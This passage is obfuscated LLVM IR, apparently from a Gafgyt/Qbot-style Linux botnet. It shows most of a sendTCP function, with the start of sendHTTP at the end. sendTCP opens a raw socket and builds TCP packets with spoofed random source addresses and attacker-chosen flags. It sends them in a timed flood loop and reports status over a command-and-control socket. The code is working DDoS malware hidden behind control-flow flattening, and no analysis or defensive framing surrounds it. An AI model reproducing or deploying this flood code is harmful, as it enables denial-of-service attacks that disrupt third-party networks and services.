  %320 = mul nsw i32 %319, 1000
  %321 = call i32 @usleep(i32 %320)
  store i32 0, i32* %34, align 4
  store i32 -842863895, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i32, i32* %34, align 4
  %324 = add i32 %323, 1
  store i32 %324, i32* %34, align 4
  store i32 -842863895, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %326 = load i8*, i8** %29, align 8
  call void @llvm.stackrestore(i8* %326)
  store i32 -147103696, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %325, %322, %318, %311, %310, %309, %303, %276, %271, %269, %253, %252, %225, %220, %218, %178, %172, %171, %167, %160, %155, %154, %151, %145, %142, %137, %136, %133, %129, %122, %121, %120, %114, %110, %106, %92, %80, %79, %71, %68, %63, %56, %55, %49, %44, %40, %first, %switchDefault
  br label %loopEntry
}

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 133337669, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 133337669, label %first
    i32 1893700425, label %32
    i32 -663121344, label %36
    i32 1598908866, label %41
    i32 -55881415, label %47
    i32 -243469107, label %48
    i32 256907669, label %55
    i32 -763433109, label %58
    i32 24542698, label %64
    i32 -1350780324, label %67
    i32 -1735311406, label %71
    i32 699005559, label %72
    i32 1308098107, label %78
    i32 1899133511, label %126
    i32 107437628, label %162
    i32 406919497, label %165
    i32 122522175, label %169
    i32 -1357505862, label %174
    i32 2013159822, label %182
    i32 -1351801807, label %187
    i32 1282474705, label %195
    i32 737364017, label %200
    i32 494275317, label %208
    i32 216853218, label %213
    i32 1101630937, label %221
    i32 -121609544, label %226
    i32 477486176, label %234
    i32 -458667090, label %238
    i32 1027146783, label %239
    i32 1647266577, label %240
    i32 -423586099, label %241
    i32 1431803129, label %242
    i32 999747909, label %244
    i32 -1278054022, label %245
    i32 -695090324, label %263
    i32 -1524797802, label %265
    i32 -1426457881, label %270
    i32 -933661063, label %296
    i32 312931501, label %297
    i32 2002946468, label %347
    i32 1331207489, label %353
    i32 -1372620442, label %354
    i32 -914320432, label %355
    i32 -644581866, label %358
    i32 -1802915579, label %360
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp eq i32 %.reload, 0
  %31 = select i1 %30, i32 1893700425, i32 -663121344
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 1598908866, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %9, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #13
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  store i32 1598908866, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i8*, i8** %8, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -55881415, i32 -243469107
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -1802915579, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %51, i32* %17, align 4
  %52 = load i32, i32* %17, align 4
  %53 = icmp ne i32 %52, 0
  %54 = select i1 %53, i32 -763433109, i32 256907669
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  store i32 -1802915579, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %59 = load i32, i32* %17, align 4
  %60 = bitcast i32* %18 to i8*
  %61 = call i32 @setsockopt(i32 %59, i32 0, i32 3, i8* %60, i32 4) #2
  %62 = icmp slt i32 %61, 0
  %63 = select i1 %62, i32 24542698, i32 -1350780324
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* @mainCommSock, align 4
  %66 = call i32 (i32, i8*, ...) @sockprintf(i32 %65, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i32 0, i32 0))
  store i32 -1802915579, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %11, align 4
  %69 = icmp eq i32 %68, 0
  %70 = select i1 %69, i32 -1735311406, i32 699005559
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 1308098107, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %11, align 4
  %74 = sub nsw i32 32, %73
  %75 = shl i32 1, %74
  %76 = sub nsw i32 %75, 1
  %77 = xor i32 %76, -1
  store i32 %77, i32* %19, align 4
  store i32 1308098107, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %13, align 4
  %80 = sext i32 %79 to i64
  %81 = add i64 40, %80
  store i64 %81, i64* %.reg2mem2
  %82 = call i8* @llvm.stacksave()
  store i8* %82, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %83 = alloca i8, i64 %.reload4, align 16
  store i8* %83, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %84 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %21, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %86 = bitcast %struct.iphdr* %85 to i8*
  %87 = getelementptr i8, i8* %86, i64 20
  %88 = bitcast i8* %87 to %struct.tcphdr*
  store %struct.tcphdr* %88, %struct.tcphdr** %22, align 8
  %89 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %90, i32 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = load i32, i32* %19, align 4
  %94 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %93)
  %95 = call i32 @htonl(i32 %94) #13
  %96 = load i32, i32* %13, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 20, %97
  %99 = trunc i64 %98 to i32
  call void @makeIPPacket(%struct.iphdr* %89, i32 %92, i32 %95, i8 zeroext 6, i32 %99)
  %100 = call i32 @rand_cmwc()
  %101 = trunc i32 %100 to i16
  %102 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon.1* %103 to %struct.anon.2*
  %105 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %104, i32 0, i32 0
  store i16 %101, i16* %105, align 4
  %106 = call i32 @rand_cmwc()
  %107 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %108 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %107, i32 0, i32 0
  %109 = bitcast %union.anon.1* %108 to %struct.anon.2*
  %110 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %109, i32 0, i32 2
  store i32 %106, i32* %110, align 4
  %111 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %112 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %111, i32 0, i32 0
  %113 = bitcast %union.anon.1* %112 to %struct.anon.2*
  %114 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %113, i32 0, i32 3
  store i32 0, i32* %114, align 4
  %115 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %116 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %115, i32 0, i32 0
  %117 = bitcast %union.anon.1* %116 to %struct.anon.2*
  %118 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %117, i32 0, i32 4
  %119 = load i16, i16* %118, align 4
  %120 = and i16 %119, -241
  %121 = or i16 %120, 80
  store i16 %121, i16* %118, align 4
  %122 = load i8*, i8** %12, align 8
  %123 = call i32 @strcmp(i8* %122, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.405, i32 0, i32 0)) #10
  %124 = icmp ne i32 %123, 0
  %125 = select i1 %124, i32 107437628, i32 1899133511
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.1* %128 to %struct.anon.2*
  %130 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -513
  %133 = or i16 %132, 512
  store i16 %133, i16* %130, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon.1* %135 to %struct.anon.2*
  %137 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = and i16 %138, -1025
  %140 = or i16 %139, 1024
  store i16 %140, i16* %137, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.1* %142 to %struct.anon.2*
  %144 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -257
  %147 = or i16 %146, 256
  store i16 %147, i16* %144, align 4
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.1* %149 to %struct.anon.2*
  %151 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -4097
  %154 = or i16 %153, 4096
  store i16 %154, i16* %151, align 4
  %155 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.1* %156 to %struct.anon.2*
  %158 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %157, i32 0, i32 4
  %159 = load i16, i16* %158, align 4
  %160 = and i16 %159, -2049
  %161 = or i16 %160, 2048
  store i16 %161, i16* %158, align 4
  store i32 -1278054022, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i8*, i8** %12, align 8
  %164 = call i8* @strtok(i8* %163, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %164, i8** %23, align 8
  store i32 406919497, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i8*, i8** %23, align 8
  %167 = icmp ne i8* %166, null
  %168 = select i1 %167, i32 122522175, i32 999747909
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8*, i8** %23, align 8
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.407, i32 0, i32 0)) #10
  %172 = icmp ne i32 %171, 0
  %173 = select i1 %172, i32 2013159822, i32 -1357505862
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %176 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon.1* %176 to %struct.anon.2*
  %178 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %177, i32 0, i32 4
  %179 = load i16, i16* %178, align 4
  %180 = and i16 %179, -513
  %181 = or i16 %180, 512
  store i16 %181, i16* %178, align 4
  store i32 1431803129, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i8*, i8** %23, align 8
  %184 = call i32 @strcmp(i8* %183, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.408, i32 0, i32 0)) #10
  %185 = icmp ne i32 %184, 0
  %186 = select i1 %185, i32 1282474705, i32 -1351801807
  store i32 %186, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.1* %189 to %struct.anon.2*
  %191 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %190, i32 0, i32 4
  %192 = load i16, i16* %191, align 4
  %193 = and i16 %192, -1025
  %194 = or i16 %193, 1024
  store i16 %194, i16* %191, align 4
  store i32 -423586099, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8*, i8** %23, align 8
  %197 = call i32 @strcmp(i8* %196, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.409, i32 0, i32 0)) #10
  %198 = icmp ne i32 %197, 0
  %199 = select i1 %198, i32 494275317, i32 737364017
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.1* %202 to %struct.anon.2*
  %204 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = and i16 %205, -257
  %207 = or i16 %206, 256
  store i16 %207, i16* %204, align 4
  store i32 1647266577, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i8*, i8** %23, align 8
  %210 = call i32 @strcmp(i8* %209, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.410, i32 0, i32 0)) #10
  %211 = icmp ne i32 %210, 0
  %212 = select i1 %211, i32 1101630937, i32 216853218
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.1* %215 to %struct.anon.2*
  %217 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %218, -4097
  %220 = or i16 %219, 4096
  store i16 %220, i16* %217, align 4
  store i32 1027146783, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i8*, i8** %23, align 8
  %223 = call i32 @strcmp(i8* %222, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.411, i32 0, i32 0)) #10
  %224 = icmp ne i32 %223, 0
  %225 = select i1 %224, i32 477486176, i32 -121609544
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 0
  %229 = bitcast %union.anon.1* %228 to %struct.anon.2*
  %230 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = and i16 %231, -2049
  %233 = or i16 %232, 2048
  store i16 %233, i16* %230, align 4
  store i32 -458667090, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i32, i32* @mainCommSock, align 4
  %236 = load i8*, i8** %23, align 8
  %237 = call i32 (i32, i8*, ...) @sockprintf(i32 %235, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.412, i32 0, i32 0), i8* %236)
  store i32 -458667090, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 1027146783, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 1647266577, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -423586099, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  store i32 1431803129, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %243, i8** %23, align 8
  store i32 406919497, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  store i32 -1278054022, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = call i32 @rand_cmwc()
  %247 = trunc i32 %246 to i16
  %248 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon.1* %249 to %struct.anon.2*
  %251 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %250, i32 0, i32 5
  store i16 %247, i16* %251, align 2
  %252 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon.1* %253 to %struct.anon.2*
  %255 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %254, i32 0, i32 6
  store i16 0, i16* %255, align 4
  %256 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 0
  %258 = bitcast %union.anon.1* %257 to %struct.anon.2*
  %259 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %258, i32 0, i32 7
  store i16 0, i16* %259, align 2
  %260 = load i32, i32* %9, align 4
  %261 = icmp eq i32 %260, 0
  %262 = select i1 %261, i32 -695090324, i32 -1524797802
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = call i32 @rand_cmwc()
  store i32 -1426457881, i32* %switchVar
  store i32 %264, i32* %.reg2mem10
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i32, i32* %9, align 4
  %267 = trunc i32 %266 to i16
  %268 = call zeroext i16 @htons(i16 zeroext %267) #13
  %269 = zext i16 %268 to i32
  store i32 -1426457881, i32* %switchVar
  store i32 %269, i32* %.reg2mem10
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %271 = trunc i32 %.reload11 to i16
  %272 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 0
  %274 = bitcast %union.anon.1* %273 to %struct.anon.2*
  %275 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %274, i32 0, i32 1
  store i16 %271, i16* %275, align 2
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %278 = call zeroext i16 @tcpcsum(%struct.iphdr* %276, %struct.tcphdr* %277)
  %279 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %280 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %279, i32 0, i32 0
  %281 = bitcast %union.anon.1* %280 to %struct.anon.2*
  %282 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %281, i32 0, i32 6
  store i16 %278, i16* %282, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %283 = bitcast i8* %.reload8 to i16*
  %284 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 2
  %286 = load i16, i16* %285, align 2
  %287 = zext i16 %286 to i32
  %288 = call zeroext i16 @csum(i16* %283, i32 %287)
  %289 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 7
  store i16 %288, i16* %290, align 2
  %291 = call i64 @time(i64* null) #2
  %292 = load i32, i32* %10, align 4
  %293 = sext i32 %292 to i64
  %294 = add nsw i64 %291, %293
  %295 = trunc i64 %294 to i32
  store i32 %295, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -933661063, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 312931501, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i32, i32* %17, align 4
  %299 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %300 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %300, %struct.sockaddr** %299, align 8
  %301 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %302 = load %struct.sockaddr*, %struct.sockaddr** %301, align 8
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %303 = call i64 @sendto(i32 %298, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %302, i32 16)
  %304 = load i32, i32* %19, align 4
  %305 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %304)
  %306 = call i32 @htonl(i32 %305) #13
  %307 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 8
  store i32 %306, i32* %308, align 4
  %309 = call i32 @rand_cmwc()
  %310 = trunc i32 %309 to i16
  %311 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 3
  store i16 %310, i16* %312, align 4
  %313 = call i32 @rand_cmwc()
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.1* %315 to %struct.anon.2*
  %317 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %316, i32 0, i32 2
  store i32 %313, i32* %317, align 4
  %318 = call i32 @rand_cmwc()
  %319 = trunc i32 %318 to i16
  %320 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon.1* %321 to %struct.anon.2*
  %323 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %322, i32 0, i32 0
  store i16 %319, i16* %323, align 4
  %324 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i32 0, i32 0
  %326 = bitcast %union.anon.1* %325 to %struct.anon.2*
  %327 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %326, i32 0, i32 6
  store i16 0, i16* %327, align 4
  %328 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %329 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %330 = call zeroext i16 @tcpcsum(%struct.iphdr* %328, %struct.tcphdr* %329)
  %331 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %332 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %331, i32 0, i32 0
  %333 = bitcast %union.anon.1* %332 to %struct.anon.2*
  %334 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %333, i32 0, i32 6
  store i16 %330, i16* %334, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %335 = bitcast i8* %.reload6 to i16*
  %336 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 2
  %338 = load i16, i16* %337, align 2
  %339 = zext i16 %338 to i32
  %340 = call zeroext i16 @csum(i16* %335, i32 %339)
  %341 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 7
  store i16 %340, i16* %342, align 2
  %343 = load i32, i32* %25, align 4
  %344 = load i32, i32* %15, align 4
  %345 = icmp eq i32 %343, %344
  %346 = select i1 %345, i32 2002946468, i32 -914320432
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = call i64 @time(i64* null) #2
  %349 = load i32, i32* %24, align 4
  %350 = sext i32 %349 to i64
  %351 = icmp sgt i64 %348, %350
  %352 = select i1 %351, i32 1331207489, i32 -1372620442
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  store i32 -644581866, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -933661063, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i32, i32* %25, align 4
  %357 = add i32 %356, 1
  store i32 %357, i32* %25, align 4
  store i32 -933661063, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %359)
  store i32 -1802915579, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %358, %355, %354, %353, %347, %297, %296, %270, %265, %263, %245, %244, %242, %241, %240, %239, %238, %234, %226, %221, %213, %208, %200, %195, %187, %182, %174, %169, %165, %162, %126, %78, %72, %71, %67, %64, %58, %55, %48, %47, %41, %36, %32, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [512 x i8], align 16
  %17 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %18 = bitcast [3 x i8*]* %13 to i8*
